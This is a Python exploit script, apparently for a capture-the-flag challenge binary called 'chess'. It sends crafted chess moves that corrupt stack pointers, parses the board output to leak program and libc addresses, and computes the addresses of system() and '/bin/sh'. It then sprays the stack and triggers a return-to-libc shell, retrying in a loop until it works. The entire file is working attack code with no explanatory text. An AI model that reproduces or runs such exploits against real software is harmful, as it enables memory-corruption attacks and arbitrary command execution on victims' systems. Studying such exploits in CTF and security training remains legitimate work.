from zio import *

target = "./chess"#("localhost", 7575)
def get_io(target):
	read_mode = COLORED(RAW, "green")
	write_mode = COLORED(RAW, "blue")
	io = zio(target, timeout = 9999, print_read = read_mode, print_write = write_mode)
	return io

def from_to(io, from_buff, to_buff):
	io.read_until("From>> ")
	io.write(from_buff + "\n")
	io.read_until("To  >> ")
	io.write(to_buff + "\n")

def run_seq(io, seq):
	for item in seq:
		from_to(io, item[0:2], item[2:4])

def trim_diff_buff(data):
	buff = data
	for i in range(1, 9):
		info = "%d|"%i
		buff = buff.replace(info, '')
		info = "|%d\n"%i
		buff = buff.replace(info, '')
	return buff

def spray_buff(io, base_buff):
	payload = "a" * 8
	while len(payload) + len(base_buff) < 1023:
		payload += base_buff
	#io.gdb_hint()
	for i in range(50):
		from_to(io, payload, payload)


def pwn(io):

	
	from_buff = ""
	to_buff = ""
	#[ebp + 8 	]= arg chess_map
	#[0xffffd550]= arg 0xffffd560

	#change [0xffffd560] = 0xffffd500 + 'r'
	

	#chess_map_addr = 0xffffd560 
	#chess_map_addr_modify = 0xffffd572
	#run_buff = 0xffffcb20
	#main_ebp = 0xffffd548
	#[ebp] = main_ebp = 0xffffd548

	seq = []
	seq.append('b2b3')
	seq.append('a8J8') #modify main_ebp 0xooooxxoo

	seq.append('a1a8') #move 'r' to head
	seq.append('e7e6')
	seq.append('b3b2')
	seq.append('e8e7')

	seq.append('a2a3')
	seq.append('e7f6')
	seq.append('a3a2')
	seq.append('f6g5')

	seq.append('a2a3')
	seq.append('g5h4')
	seq.append('a3a2')
	seq.append('h4h3')

	seq.append('a2a3')
	seq.append('h3h2')
	seq.append('a3a2')
	seq.append('h2h1')

	seq.append('b2b3')
	seq.append('h1g1') 
	seq.append('b3b2')
	seq.append('g1f1')

	seq.append('a8Q8') #modify chess_map_addr

	run_seq(io, seq)
	#io.interact()
	#test
	#base_buff = ('a' * 4 * 2 + 'b' * 4 * 2)
	#spray_buff(io, base_buff)
	#
	#io.gdb_hint()

	#io.interact()

	data = io.read_until(["Invalid move, try again", " move..."])
	print "data---"
	print data
	if "Invalid move, try again" in data:
		io.close()
		return ;

	pos_b = data.find("kK")
	if pos_b == -1:
		return

	pos_b = data.find(" /--------\\\n") + len(" /--------\\\n")
	pos_e = data.find(" \--------/\n")

	origin_data = data
	data = data[pos_b:pos_e]

	chess_map = trim_diff_buff(data)


	pos_b = chess_map.find("kK  ") + 4

	if pos_b > 64 - 12:
		return
	stack_offset = 64 - pos_b
	print "stack_offset:", stack_offset

	print [c for c in chess_map]
	pos_b = chess_map.find("kK  ") + 4

	print [c for c in chess_map]
	print hex(l32(chess_map[pos_b:pos_b + 4]))
	print hex(l32(chess_map[pos_b+4:pos_b+4 + 4]))
	print hex(l32(chess_map[pos_b+8:pos_b+8 + 4]))
	print hex(l32(chess_map[pos_b+0xC:pos_b+0xC + 4]))
	#io.gdb_hint()

	text_addr = l32(chess_map[pos_b:pos_b + 4])
	libc_addr = l32(chess_map[pos_b+12:pos_b+12 + 4])

	text_base = text_addr - (0xf7747680 - (0xf77473c8 - 0x13c8))
	

	offset___libc_start_main_ret = 0x19a83
	offset_system = 0x0003e800
	offset_str_bin_sh = 0x15f9e4

	is_local = True
	if is_local == False:
		offset___libc_start_main_ret = 0x19a63
		offset_system = 0x0003e360
		offset_str_bin_sh = 0x15d1a9

	libc_base = libc_addr - offset___libc_start_main_ret
	system_addr = libc_base + offset_system
	binsh_addr = libc_base + offset_str_bin_sh

	base_buff = l32(system_addr)*2 + l32(binsh_addr)*2

	spray_buff(io, base_buff)
	
	print "text_base:", hex(text_base)
	print "break_pos:", hex(text_base + 0x1605)
	print "system_addr:", hex(system_addr)
	
	print origin_data

	kK_pos = pos_b = origin_data.find("kK")
	pos_b = origin_data.find("|", pos_b + 1)
	while origin_data[pos_b + 2] != '\n':
		pos_b = origin_data.find("|", pos_b + 1)

	line_pos = int(origin_data[pos_b + 1])

	K_pos = 8 - (pos_b - (kK_pos + 1))
	k_pos = 8 - (pos_b - kK_pos)
	from_buff =  chr(ord('a')+K_pos) + "%d"%line_pos
	to_buff += chr(ord('a')+k_pos) + "%d"%line_pos

	print from_buff
	print to_buff
	from_to(io, from_buff, to_buff)

	io.interact()

while True:
	try:
		io = get_io(target)
		pwn(io)	
	except Exception, e:
		pass
	else:
		pass
	finally:
		io.close()

